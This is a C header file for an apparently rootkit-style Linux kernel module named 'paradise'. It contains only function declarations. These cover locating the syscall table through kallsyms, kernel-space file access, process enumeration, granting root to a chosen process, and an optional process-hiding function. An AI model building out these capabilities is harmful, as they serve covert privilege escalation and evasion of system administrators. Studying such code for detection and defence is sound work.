#pragma GCC diagnostic ignored "-Wunused-function"

#ifndef PARADISE_KKIT_H
#define PARADISE_KKIT_H

#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/version.h>

/// Kernel operation

unsigned long paradise_kallsyms_lookup_name(const char* symbol_name);

unsigned long * paradise_find_syscall_table(void);

/// ====================

/// File operation

int paradise_flip_open(const char *filename, int flags, umode_t mode, struct file **f);

int paradise_flip_close(struct file **f, fl_owner_t id);

bool is_file_exist(const char *filename);

/// ====================

/// Process operation

struct paradise_task_struct {
    struct task_struct *task;
    char cmdline[256];
    int cmdline_len;
};

int is_pid_alive(pid_t pid);

int mark_pid_root(pid_t pid);

static void foreach_process(void (*callback)(struct paradise_task_struct *));

pid_t find_process_by_name(const char *name);

#if INJECT_SYSCALLS == 1
int hide_process(pid_t pid);
#endif

/// ====================

#endif //PARADISE_KKIT_H
